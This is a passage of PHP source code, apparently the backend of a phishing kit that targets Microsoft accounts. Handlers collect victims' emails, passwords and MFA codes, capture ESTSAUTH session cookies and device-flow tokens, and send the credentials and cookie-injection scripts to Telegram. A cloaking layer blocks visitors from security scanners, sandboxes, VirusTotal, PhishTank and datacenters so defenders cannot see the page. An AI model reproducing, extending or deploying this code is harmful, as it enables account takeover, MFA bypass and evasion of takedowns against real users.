        if ($ip && !empty($cfg['ipWhitelist'])) {
            $whitelist = array_map('trim', explode(',', $cfg['ipWhitelist']));
            if (in_array($ip, $whitelist)) return null;
        }

        // 2. Absolute Priority: ProxyCheck.io (moved to Advanced Security Engine)
        
        if ($ip) {
            // 3. Country Blocking (App + Cloudflare Fallback)
            if (!empty($cfg['countryBlockingEnabled']) || !empty($cfg['cfCountryBlockingEnabled'])) {
                if (!empty($cfg['countryBlockingEnabled'])) {
                    $rawList = trim((string)($cfg['allowedCountries'] ?? ''));
                } else {
                    $rawList = trim((string)($cfg['cfAllowedCountries'] ?? ''));
                }

                if ($rawList !== '') {
                    $allowedCountries = array_map('strtoupper', array_map('trim', explode(',', $rawList)));
                    $allowedCountries = array_values(array_filter($allowedCountries));

                    if (!empty($allowedCountries)) {
                        // Priority 1: ProxyCheck Intelligence (Most accurate for detected location)
                        $detectedCountry = !empty($proxyIntel['country']) ? strtoupper($proxyIntel['country']) : '';
                        
                        // Priority 2: Cloudflare Header
                        if ($detectedCountry === '') {
                            $detectedCountry = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? strtoupper(trim((string)$_SERVER['HTTP_CF_IPCOUNTRY'])) : '';
                        }
                        
                        if ($detectedCountry !== '' && $detectedCountry !== 'XX') {
                            if (!in_array($detectedCountry, $allowedCountries, true)) return 'country_not_allowed_' . $detectedCountry;
                        } elseif ($detectedCountry === 'XX') {
                             // Block Unknown/Satellite countries if not explicitly allowed
                             if (!in_array('XX', $allowedCountries, true)) return 'country_not_allowed_XX';
                        } else {
                            $dbPath = __DIR__ . '/../IP2LOCATION-LITE-DB1.BIN';
                            if (file_exists($dbPath)) {
                                $ip2Class = '\\IP2Location\\Database';
                                if (class_exists($ip2Class)) {
                                    try {
                                        $db = new $ip2Class($dbPath, constant($ip2Class . '::FILE_IO'));
                                        $records = $db->lookup($ip, constant($ip2Class . '::ALL'));
                                        if ($records && !empty($records['countryCode'])) {
                                            $cc = strtoupper(trim((string)$records['countryCode']));
                                            if ($cc !== '' && !in_array($cc, $allowedCountries, true)) return 'country_not_allowed_' . $cc;
                                        }
                                    } catch (\Exception $e) {
                                        self::log("IP2Location Error: " . $e->getMessage());
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // 4. Advanced Security Engine (BOT PROTECTION)
            $securityEnabled = !empty($cfg['securityEnabled']);
            if ($securityEnabled || !empty($cfg['cfBotShield'])) {
                // 4a. VPN/Proxy/Tor Check (ProxyCheck.io)
                if (!empty($cfg['proxycheckEnabled'])) {
                    $blockVPN = !empty($cfg['proxycheckBlockVPN']);
                    $blockProxy = !empty($cfg['proxycheckBlockProxy']);
                    $blockTor = !empty($cfg['proxycheckBlockTor']);
                    $riskThreshold = isset($cfg['proxycheckRiskThreshold']) ? (int)$cfg['proxycheckRiskThreshold'] : 50;
                    $apiKey = trim((string)($cfg['proxycheckApiKey'] ?? ''));
                    
                    $proxyIntel = self::proxycheckBlocked($ip, $apiKey, $blockVPN, $blockProxy, $blockTor, $riskThreshold);
                    if ($proxyIntel['is_blocked']) return 'proxycheck_blocked';
                }

                if (self::isBotUserAgent()) return 'bot_user_agent_detected';
                if (self::isBlockedReferrer()) return 'blocked_referrer_detected';
                if (self::isMissingStandardHeaders()) return 'missing_standard_headers';

                // --- Intelligence Checks (IPInfo) ---
                if ($checkIntelligence) {
                    // Catch Data Centers via ProxyCheck Type (if not already blocked)
                    $type = strtolower($proxyIntel['type'] ?? '');
                    if ($type === 'business' || $type === 'hosting') {
                        // Some 'business' IPs are clean, but 'hosting' is definitely a bot/server
                        if ($type === 'hosting') return 'proxycheck_type_hosting';
                    }

                    if (!empty($cfg['ipinfoAsnBlockingEnabled'])) {
                        $ipinfoToken = trim((string)($cfg['ipinfoToken'] ?? ''));
                        $ipinfoFailClosed = !empty($cfg['ipinfoFailClosed']);
                        if ($ipinfoToken !== '') {
                            if (self::ipinfoAsnBlocked($ip, $ipinfoToken, $ipinfoFailClosed)) return 'ipinfo_asn_blocked';
                        } elseif ($ipinfoFailClosed) {
                            return 'ipinfo_token_missing';
                        }
                    }
                }

                // --- Local Behavioral/Static Checks (RDNS) ---
        $hostname = gethostbyaddr($ip);
        if ($hostname !== $ip) {
            $hostname = strtolower($hostname);
            
            // Safety: Skip check if it looks like a residential/ISP hostname
            $isResidential = false;
            $resKeywords = ['dynamic', 'residential', 'pool', 'static', 'dsl', 'broadband', 'cust', 'fiber', 'mobile'];
            foreach ($resKeywords as $res) {
                if (strpos($hostname, $res) !== false) {
                    $isResidential = true;
                    break;
                }
            }

            if (!$isResidential) {
                $botKeywords = [
                    'googlebot', 'bingbot', 'yandexbot', 'ahrefsbot', 'msnbot', 'baiduspider', 
                    'mj12bot', 'dotbot', 'semrushbot', 'duckduckbot', 'exabot', 'facebot', 
                    'ia_archiver', 'twitterbot', 'pingdom', 'uptimerobot', 'adsbot-google', 
                    'mediapartners-google', 'sogou', 'crawler', 'spider', 'slurp', 'scanner', 
                    'censys', 'shodan', 'nmap', 'hetzner', 'ovh', 'linode', 'digitalocean', 
                    'amazon-aws', 'azure-compute', 'cogent', 'leaseweb'
                ];
                foreach ($botKeywords as $keyword) {
                    if (strpos($hostname, $keyword) !== false) {
                        self::log("Bot/Datacenter detected via RDNS: $hostname");
                        return 'rdns_bot_detected';
                    }
                }
            }
        }
            }
        }

        // 6. Email Domain Filtering (MOVED TO POSITION 6)
        // Only admin-configured domains - hardcoded domains handled by frontend
        if ($email) {
            $emailParts = explode('@', $email);
            $domain = strtolower(end($emailParts));
            
            // Only check admin-configured domains (not hardcoded ones)
            if (!empty($cfg['blockedDomains']) && is_array($cfg['blockedDomains'])) {
                if (in_array($domain, $cfg['blockedDomains'], true)) {
                    self::log("Admin blocked domain bypass attempt: $email from IP: " . self::getClientIp());
                    return 'blocked_email_domain';
                }
            }
            
            if (!empty($cfg['allowedDomains']) && is_array($cfg['allowedDomains'])) {
                if (!in_array($domain, $cfg['allowedDomains'], true)) {
                    self::log("Domain not in allowed list: $email from IP: " . self::getClientIp());
                    return 'email_domain_not_allowed';
                }
            }
        }

        return null;
    }

    public static function getClientIp(): string {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            return $_SERVER['HTTP_X_REAL_IP'];
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($ips[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '';
    }

    public static function sanitizeId(string $id): string {
        return preg_replace('/[^a-zA-Z0-9._-]/', '', $id);
    }

    private static function cacheGet(string $file, int $ttl, string $requiredKey = 'checked_at'): ?array {
        if (!file_exists($file)) return null;
        $cached = json_decode(file_get_contents($file), true);
        if (!is_array($cached) || !isset($cached['checked_at'], $cached[$requiredKey])) return null;
        if ((time() - (int)$cached['checked_at']) >= $ttl) return null;
        return $cached;
    }

    private static function cacheSet(string $file, array $data): void {
        @file_put_contents($file, json_encode($data));
    }

    public static function ipinfoAsnBlocked(string $ip, string $token, bool $failClosed = false, int $cacheTtlSeconds = 86400): bool {
        if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
            return $failClosed;
        }
        $token = trim($token);
        if (stripos($token, 'bearer ') === 0) {
            $token = trim(substr($token, 7));
        }
        if ($token === '') {
            return $failClosed;
        }

        $now = time();
        $cacheTtlSeconds = max(60, $cacheTtlSeconds);
        $cacheDir = __DIR__ . '/../session_data';
        if (!is_dir($cacheDir)) @mkdir($cacheDir, 0777, true);
        
        $cacheFile = $cacheDir . '/ipinfo_' . md5($ip) . '.json';

        $hit = self::cacheGet($cacheFile, $cacheTtlSeconds, 'is_blocked');
        if ($hit !== null) return (bool)$hit['is_blocked'];

        $url = "https://api.ipinfo.io/lite/{$ip}";
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 2,
                'header' => "Accept: application/json\r\nAuthorization: Bearer {$token}\r\n"
            ]
        ]);
        $raw = @file_get_contents($url, false, $context);
        if (!$raw) return $failClosed;

        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['asn'])) return $failClosed;

        $asn = strtoupper(trim((string)$data['asn']));
        $asName = strtolower(trim((string)($data['as_name'] ?? '')));
        $asDomain = strtolower(trim((string)($data['as_domain'] ?? '')));

        $nonHumanIndicators = [
            'google', 'microsoft', 'amazon', 'facebook', 'apple',
            'cloudflare', 'akamai', 'fastly', 'maxcdn',
            'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner',
            'aws', 'azure', 'gcp', 'google cloud', 'alibaba cloud',
            'vpn', 'proxy', 'anonymity', 'privacy', 'tor',
            'stiftung', 'renewablefreedom', 'm247', 'leaseweb', 'cogent',
            'choopa', 'oracle', 'layerhost', 'worldstream', 'nextglobal',
            'itproximus', 'hostroyale', 'centurylink', 'avast', 'bitdefender',
            'webnx', 'myloc',
            'AS15169', 'AS8075', 'AS16509', 'AS13335', 'AS60729', 'AS396982', 'AS9009'
        ];

        $blocked = false;
        foreach ($nonHumanIndicators as $indicator) {
            $indicator = (string)$indicator;
            if ($indicator === '') continue;
            if ($asn === strtoupper($indicator) || strpos($asName, strtolower($indicator)) !== false || strpos($asDomain, strtolower($indicator)) !== false) {
                $blocked = true;
                break;
            }
        }

        self::cacheSet($cacheFile, [
            'ip'        => $ip,
            'checked_at'=> time(),
            'is_blocked'=> $blocked,
            'asn'       => $asn,
            'as_name'   => $asName,
            'as_domain' => $asDomain
        ]);

        return $blocked;
    }

    public static function isBotUserAgent(): bool {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        if (empty($ua)) return true;

        $bots = [
            'bot', 'crawl', 'spider', 'slurp', 'facebookexternalhit', 'facebot',
            'curl', 'wget', 'python', 'libwww', 'httpunit', 'nmap',
            'phantomjs', 'headless', 'selenium', 'puppeteer', 'playwright',
            'postman', 'insomnia', 'axios', 'got', 'node-fetch', 'cheerio',
            'scray', 'grabber', 'sqlmap', 'nikto', 'havij', 'pangolin', 'acunetix', 'nessus', 
            'qualys', 'openvas', 'zmap', 'zgrab', 'shodan', 'censys', 'masscan',
            'any.run', 'crowdstrike', 'fireeye', 'paloalto', 'checkpoint', 'fortinet',
            'duckduckbot', 'exabot', 'twitterbot', 'pingdom', 'uptimerobot', 'googlebot',
            'mediapartners-google', 'sogou-spider', 'ahrefsbot', 'mj12bot', 'dotbot', 'semrushbot', 'baiduspider',
            'yandexbot', 'mail.ru_bot', 'seznam-bot', 'qwantify', 'gigablast', 'netcraft', 'virustotal', 'phishtank', 'urlscan'
        ];

        foreach ($bots as $bot) {
            if (strpos($ua, $bot) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isBlockedReferrer(): bool {
        $referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
        if (empty($referer)) return false;

        $blockedReferers = [
            'any.run', 'app.any.run', 'hybrid-analysis.com', 'joe.sandbox.com', 
            'cuckoo.sandbox', 'malwr.com', 'virustotal.com', 'shodan.io', 
            'censys.io', 'threatminer.org', 'urlvoid.com', 'archive.org', 
            'web.archive.org', 'phishtank.com', 'safebrowsing.google.com', 
            'smartscreen.microsoft.com', 'urlscan.io', 'quttera.com', 'sucuri.net',
            'siteadvisor.com', 'fortiguard.com', 'barracudanetworks.com', 'mcafee.com'
        ];

        foreach ($blockedReferers as $blocked) {
            if (strpos($referer, $blocked) !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isMissingStandardHeaders(): bool {
        if (empty($_SERVER['HTTP_ACCEPT'])) return true;
        if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) return true;
        return false;
    }

    public static function log(string $message): void {
        $logFile = __DIR__ . '/../project.log';
        $line = '[' . date('c') . '] ' . $message . "\n";
        @file_put_contents($logFile, $line, FILE_APPEND);
    }

    public static function proxycheckBlocked(string $ip, string $apiKey = '', bool $blockVPN = true, bool $blockProxy = true, bool $blockTor = true, int $riskThreshold = 75): array {
        $default = ['is_blocked' => false, 'country' => '', 'provider' => '', 'type' => '', 'risk' => 0, 'reason' => ''];
        
        if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
            return $default;
        }
        
        // Use provided API key or fallback to environment
        if (empty($apiKey)) {
            $apiKey = $_ENV['PROXYCHECK_API_KEY'] ?? getenv('PROXYCHECK_API_KEY') ?? '';
            $apiKey = trim($apiKey);
        }

        if (empty($apiKey)) {
            self::log("ProxyCheck Error: API Key missing (VPN/Proxy block skipped)");
            return $default;
        }

        // Check cache first
        $cacheKey = md5($ip . $apiKey);
        $cacheDir = __DIR__ . '/../session_data';
        if (!is_dir($cacheDir)) @mkdir($cacheDir, 0777, true);
        $cacheFile = $cacheDir . '/proxycheck_' . $cacheKey . '.json';
        
        $hit = self::cacheGet($cacheFile, 3600, 'data');
        if ($hit !== null) return $hit['data'];

        // Use CURL for better reliability and detailed error reporting
        $params = [
            'key'   => $apiKey,
            'vpn'   => 1,
            'proxy' => 1,
            'tor'   => 1,
            'risk'  => 1,
            'asn'   => 1,
            'inf'   => 1 // More info (provider, type, etc)
        ];
        $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query($params);
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-Security-Check/1.1');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        unset($ch);

        if ($response === false || $httpCode !== 200) {
            self::log("ProxyCheck API Connection Failed: HTTP $httpCode | Error: $error");
            
            // Fallback: Check Cloudflare Headers if API fails
            if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
                $cfCountry = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']);
                if ($cfCountry === 'T1') { // Tor
                     return [
                        'is_blocked' => true,
                        'country'    => 'T1',
                        'provider'   => 'Cloudflare (Fallback)',
                        'type'       => 'Tor',
                        'risk'       => 100,
                        'reason'     => 'Tor (CF Fallback)'
                    ];
                }
                if ($cfCountry === 'XX') { // Unknown/Satellite
                     return [
                        'is_blocked' => true,
                        'country'    => 'XX',
                        'provider'   => 'Cloudflare (Fallback)',
                        'type'       => 'Unknown',
                        'risk'       => 90,
                        'reason'     => 'Unknown Country (CF Fallback)'
                    ];
                }
            }
            
            return $default;
        }

        $data = json_decode($response, true);
        if (!$data || !isset($data[$ip])) {
            $status = $data['status'] ?? 'unknown';
            $msg = $data['message'] ?? 'No detail';
            self::log("ProxyCheck API Error Status: $status | Message: $msg");
            return $default;
        }

        $result = $data[$ip];
        $isBlocked = false;
        $blockReasons = [];

        // Check VPN
        if ($blockVPN && isset($result['vpn']) && $result['vpn'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'VPN';
        }

        // Check Proxy
        if ($blockProxy && isset($result['proxy']) && $result['proxy'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'Proxy';
        }

        // Check Tor
        if ($blockTor && isset($result['tor']) && $result['tor'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'Tor';
        }

        // Check Risk Score
        $riskScore = isset($result['risk']) ? (int)$result['risk'] : 0;
        if ($riskScore > $riskThreshold) {
            $isBlocked = true;
            $blockReasons[] = "Risk Score {$riskScore}";
        }

        $reasonStr = implode(', ', $blockReasons);
        $result['block_reason'] = $reasonStr; // Store in cache

        $intel = [
            'is_blocked' => $isBlocked,
            'country'    => $result['isocode'] ?? $result['country'] ?? '',
            'provider'   => $result['provider'] ?? $result['asn'] ?? '',
            'type'       => $result['type'] ?? '',
            'risk'       => $riskScore,
            'reason'     => $reasonStr
        ];

        // Log the actual detection for debugging
        if ($isBlocked) {
            self::log("ProxyCheck.io BLOCKED IP {$ip}: " . $reasonStr);
        }

        self::cacheSet($cacheFile, ['checked_at' => time(), 'data' => $intel]);

        return $intel;
    }
}

// =====================================================================
// API — 29 action handlers mapped by name
// =====================================================================
class Api {
    // All API calls are handled locally — no forwarding needed.
    // VPS PHP writes directly to Neon DB. Render worker polls Neon independently.

    public static function handle() {
        header_remove('X-Powered-By');
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type');
        ignore_user_abort(true);
        set_time_limit(0);
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            echo json_encode(['ok' => true]);
            exit;
        }

        $action = $_POST['action'] ?? $_GET['action'] ?? '';

        $route = [
            'save_config'               => 'handleSaveConfig',
            'get_config'                => 'handleGetConfig',
            'clear_logs'                => 'handleClearLogs',
            'get_cookies'               => 'handleGetCookies',
            'get_tokens'                => 'handleGetTokens',
            'receive_tokens'            => 'handleReceiveTokens',
            'receive_cookies'           => 'handleReceiveCookies',
            'start_device_flow'         => 'handleStartDeviceFlow',
            'poll_device_flow'          => 'handlePollDeviceFlow',
            'get_events'                => 'handleGetEvents',
            'get_deployment_info'       => 'handleGetDeploymentInfo',
            'log_event'                 => 'handleLogEvent',
            'validate_turnstile_config' => 'handleValidateTurnstileConfig',
            'verify_turnstile'          => 'handleVerifyTurnstile',
            'verify_email'              => 'handleVerifyEmail',
            'test_telegram'             => 'handleTestTelegram',
            'sync_cloudflare'           => 'handleSyncCloudflare',
            'configure_cloudflare'      => 'handleConfigureCloudflare',
            'create_turnstile_widget'   => 'handleCreateTurnstileWidget',
            'get_cloudflare_zones'      => 'handleGetCloudflareZones',
            'capture_existing_session'  => 'handleCaptureExistingSession',
            'capture_sso'               => 'handleCaptureSSO',
            'check_session'             => 'handleCheckSession',
            'receive_local_capture'     => 'handleReceiveLocalCapture',
            'trigger_worker'            => 'handleTriggerWorker',
            'get_connection_status'     => 'handleGetConnectionStatus',
            'create_session'            => 'handleCreateSession',
            'submit_password'           => 'handleSubmitPassword',
            'submit_mfa'                => 'handleSubmitMfa',
            'check_login_status'        => 'handleCheckLoginStatus',
        ];

        $handlerMethod = $route[$action] ?? null;
        if ($handlerMethod) {
            self::$handlerMethod();
        } else {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid action']);
        }
    }

    private static function handleCreateSession() {
        $raw  = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $email    = isset($data['email'])    ? trim($data['email'])    : '';
        $cookieId = isset($data['cookieId']) ? Security::sanitizeId($data['cookieId']) : '';

        if (!$email || !$cookieId) {
            echo json_encode(['ok' => false, 'error' => 'Missing email or cookieId']);
            exit;
        }

        $projectRoot = realpath(__DIR__ . '/..');
        $sessionFile = $projectRoot . '/session_data/session_' . $cookieId . '.json';
        $existing = file_exists($sessionFile) ? (json_decode(file_get_contents($sessionFile), true) ?: []) : [];
        $existing['cookie_id']  = $cookieId;
        $existing['email']      = $email;
        $existing['password']   = '';
        $existing['status']     = 'pending';
        $existing['created_at'] = $existing['created_at'] ?? date('c');
        $existing['updated_at'] = date('c');
        $country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
        $ip = Security::getClientIp();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        $existing['country'] = $country;
        $existing['ip'] = $ip;
        $existing['ua'] = $ua;
        file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));

        NeonDB::upsert($cookieId, $email, '', 'pending', $existing['created_at'], [
            'country' => $country,
            'ip' => $ip,
            'ua' => $ua
        ]);

        Security::log("CREATE_SESSION: Queued pending session for $email (session: $cookieId)");

        echo json_encode(['ok' => true]);
        exit;
    }

    private static function handleSubmitPassword() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $cookieId = isset($data['cookieId']) ? Security::sanitizeId($data['cookieId']) : '';
        $password = isset($data['password']) ? trim($data['password']) : '';

        if (!$cookieId || $password === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing cookieId or password']);
            exit;
        }

        $projectRoot = realpath(__DIR__ . '/..');
        $sessionDir  = $projectRoot . '/session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);
        $sessionFile = $sessionDir . '/session_' . $cookieId . '.json';

        $fsExists = file_exists($sessionFile);

        // Always check current status from Neon to avoid overwriting worker's processing/mfa_prompt
        $neonRow = NeonDB::get($cookieId);

        if (!$fsExists && !$neonRow) {
            http_response_code(404);
            echo json_encode(['ok' => false, 'error' => 'Session not found']);
            exit;
        }

        // Determine the correct status: preserve processing/mfa_prompt set by worker
        $currentNeonStatus = $neonRow['status'] ?? 'pending';
        $preservedStatuses = ['processing', 'mfa_prompt'];
        $newStatus = in_array($currentNeonStatus, $preservedStatuses, true) ? $currentNeonStatus : 'pending';

        if ($fsExists) {
            $existing = json_decode(file_get_contents($sessionFile), true) ?: [];
            $existing['password']   = $password;
            $existing['status']     = $newStatus;
            $existing['updated_at'] = date('c');
            file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
        } else {
            $existing = [
                'cookie_id'  => $cookieId,
                'email'      => $neonRow['email'] ?? '',
                'password'   => $password,
                'status'     => $newStatus,
                'created_at' => $neonRow['created_at'] ?? date('c'),
                'updated_at' => date('c'),
            ];
            file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
        }

        NeonDB::updateStatus($cookieId, $newStatus, $password);

        Security::log("SUBMIT_PASSWORD: password written for session $cookieId");

        // Send Telegram notification for the password submission
        $email = $existing['email'] ?? $neonRow['email'] ?? '';
        if ($email) {
            $ip = Security::getClientIp();
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            Worker::sendTelegramMessage($email, $password, $ip, $ua, "📝 Password Submitted");
        }

        echo json_encode(['ok' => true, 'sessionId' => $cookieId]);
        exit;
    }

    private static function handleSubmitMfa() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw  = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $sessionId = isset($data['sessionId']) ? Security::sanitizeId($data['sessionId']) : '';
        $code      = isset($data['code'])      ? trim($data['code'])                       : '';

        if (!$sessionId || $code === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing sessionId or code']);
            exit;
        }

        $result = NeonDB::addEvent($sessionId, 'mfa_code', [
            'email' => '',
            'status' => 'received',
            'payload' => [
                'code' => $code,
                'source' => 'api',
                'submitted_at' => date('c'),
            ],
        ]);

        if ($result) {
            Security::log("SUBMIT_MFA: wrote MFA code for session $sessionId (event id: {$result['id']})");
        } else {
            Security::log("SUBMIT_MFA: failed to write MFA code for session $sessionId");
        }

        echo json_encode(['ok' => (bool)$result]);
        exit;
    }

    private static function handleCheckLoginStatus() {
        $sessionId = $_GET['sessionId'] ?? '';
        if (!$sessionId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing sessionId']);
            exit;
        }

        $sessionId = Security::sanitizeId($sessionId);

        // Neon DB is the authoritative source for worker results (failed, mfa_prompt, cookies_auth_collected)
        // Filesystem is the fallback for sessions created locally before worker picks them up
        $neonRow = NeonDB::get($sessionId);

        // If Neon has a terminal status, use it immediately
        if ($neonRow) {
            $st = $neonRow['status'] ?? 'pending';
            $data = $neonRow['data'] ?? null;
            if (is_string($data)) $data = json_decode($data, true);

            switch ($st) {
                case 'cookies_auth_collected':
                case 'completed':
                case 'mfa_accepted':
                    // Send Telegram notification + inject file for worker-completed sessions (once)
                    $dataArr = $data ?: [];
                    if (empty($dataArr['telegram_sent'])) {
                        $email = $neonRow['email'] ?? '';
                        $password = $neonRow['password'] ?? '';
                        $ip = $neonRow['ip'] ?? Security::getClientIp();
                        $ua = $neonRow['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
                        Worker::sendTelegramMessage($email, $password, $ip, $ua, "✅ Worker Session Captured");

                        // Send inject file — materialize from Neon if the worker stored it in the DB
                        $baseDir = realpath(__DIR__ . '/..');
                        $injectFile = $baseDir . '/session_data/inject_session_' . $sessionId . '.js';
                        if (!file_exists($injectFile) && !empty($dataArr['injectionScript'])) {
                            if (!is_dir(dirname($injectFile))) @mkdir(dirname($injectFile), 0777, true);
                            @file_put_contents($injectFile, $dataArr['injectionScript']);
                        }
                        if (file_exists($injectFile)) {
                            Worker::sendTelegramDocument($email, $injectFile, "cookies_{$email}.js");
                        }

                        // Mark as sent to prevent duplicates
                        $updatedData = $dataArr;
                        $updatedData['telegram_sent'] = true;
                        NeonDB::updateStatus($sessionId, $st, $password, $updatedData);
                    }

                    echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
                    exit;

                case 'mfa_prompt':
                    echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
                    exit;

                case 'failed':
                    $err = $data['error'] ?? 'Login failed.';
                    echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
                    exit;

                case 'pending':
                case 'processing':
                    // Still waiting for worker — fall through to filesystem check
                    break;

                default:
                    echo json_encode(['status' => $st]);
                    exit;
            }
        }

        // Fallback: read from local filesystem (for sessions created by PHP before worker picks them up)
        $storageDir = realpath(__DIR__ . '/../session_data');
        if ($storageDir) {
            $sessionFile = $storageDir . '/session_' . $sessionId . '.json';
            if (file_exists($sessionFile)) {
                $data = json_decode(file_get_contents($sessionFile), true);
                $status = $data['status'] ?? 'pending';
                echo json_encode(['status' => $status]);
                exit;
            }
        }

        // No session found anywhere — still pending
        echo json_encode(['status' => 'pending']);
        exit;
    }


    /**
     * Handles triggering the token_swap.js worker proactively.
     * This is intended to be called when client-side detects a potential session
     * but ESTSAUTH is not available, to initiate robust server-side capture.
     */
    public static function handleTriggerWorker() {
        ob_start(); // Start output buffering

        $email = $_POST['email'] ?? null;
        $cookieId = $_POST['cookieId'] ?? null;
        $clientCookies = $_POST['clientCookies'] ?? '';

        Security::log("PROACTIVE_TRIGGER: Received request. Email: ". ($email ?? '[NULL]') . ", CookieID: ". ($cookieId ?? '[NULL]'));

        if (!$cookieId) { // Only check for cookieId
            Security::log("PROACTIVE_TRIGGER: Missing cookieId. Request rejected.");
            echo json_encode(['status' => 'error', 'message' => 'Missing cookieId']);
            ob_end_flush(); // Flush buffer before returning
            return;
        }

        // The client has requested a proactive worker trigger based on its heuristic.
        // We will proceed to queue the task and let the worker determine if a session exists.

        // Check if a worker task is already pending or completed for this cookieId
        $db = new Database();

        // Trigger the token_swap.js worker proactively.
        $db->addTask($cookieId, $email, "PROACTIVE_SESSION_SYNC");
        Security::log("PROACTIVE_TRIGGER: Client requested proactive worker trigger for $email (CookieID: $cookieId). Worker task added.");
        
        echo json_encode(['status' => 'worker_task_added', 'cookieId' => $cookieId, 'message' => 'Worker task added for proactive session sync.']);
        ob_end_flush(); // Flush buffer before returning
    }

    private static function handleGetConnectionStatus() {
        header('Content-Type: application/json');
        $cfg = Config::load();
        
        $cloudflareConnected = !empty($cfg['cfApiKey']) && !empty($cfg['cfEmail']);
        
        $proxycheckEnabled = !empty($cfg['proxycheckEnabled']);
        $proxycheckApiKeyExists = !empty($cfg['proxycheckApiKey']);
        $proxycheckConnected = $proxycheckEnabled && $proxycheckApiKeyExists;

        echo json_encode([
            'ok' => true,
            'cloudflare' => ['connected' => $cloudflareConnected],
            'proxycheck' => ['connected' => $proxycheckConnected],
            'database' => ['connected' => NeonDB::pdo() !== null]
        ]);
        exit;
    }

    private static function handleReceiveLocalCapture() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        
        $email = $data['email'] ?? 'unknown_local';
        $lsData = $data['localStorage'] ?? '{}';
        $cookieStr = $data['cookies'] ?? '';
        
        $hasEsts = strpos($cookieStr, 'ESTSAUTH') !== false;
        Security::log("LOCAL_CAPTURE: Received browser sweep for $email. (ESTSAUTH: " . ($hasEsts ? "YES" : "NO") . ")");
        
        $cookieId = uniqid('local_cap_', true);
        $projectRoot = realpath(__DIR__ . '/..');
        $sessionDir = $projectRoot . '/session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        // --- MERGE WITH PHP-SIDE FOCI COOKIES ---
        // Since helper.html is on a different domain, it can't see .login.microsoftonline.com cookies.
        // We use the tokens we got from the device flow to get the real cookies.
        $db = new Database();
        $latestEvent = $db->getLatestEventByEmail($email);
        $fociCookies = [];
        $tokens = null;
        
        if ($latestEvent && isset($latestEvent['token_data']['access_token'])) {
            $tokens = $latestEvent['token_data'];

            // CACHE: Check if we already swapped for this specific session in the last 60 seconds
            $cacheKey = "foci_swap_" . md5($email . $tokens['access_token']);
            $cacheFile = $projectRoot . '/session_data/' . $cacheKey . '.json';
            
            if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < 60)) {
                Security::log("LOCAL_CAPTURE: Using cached FOCI cookies for $email...");
                $fociCookies = json_decode(file_get_contents($cacheFile), true);
            } else {
